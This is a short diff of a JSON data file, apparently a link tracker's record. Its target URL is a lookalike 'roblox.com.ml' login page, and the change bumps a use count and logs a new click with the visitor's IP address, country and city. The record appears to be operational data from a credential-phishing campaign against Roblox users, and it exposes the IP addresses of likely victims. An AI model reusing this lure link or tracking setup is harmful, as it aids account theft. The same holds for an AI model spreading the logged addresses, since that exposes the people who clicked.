@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 171,
+    "useCount": 172,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1478,6 +1478,14 @@
         "ip": "181.233.90.53",
         "country": "Venezuela",
         "city": "Cabimas",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
+      },
+      {
+        "timestamp": 1776961194805,
+        "ip": "190.97.231.238",
+        "country": "Venezuela",
+        "city": "Cumaná",
         "flag": "🇻🇪",
         "countryCode": "VE"
       }
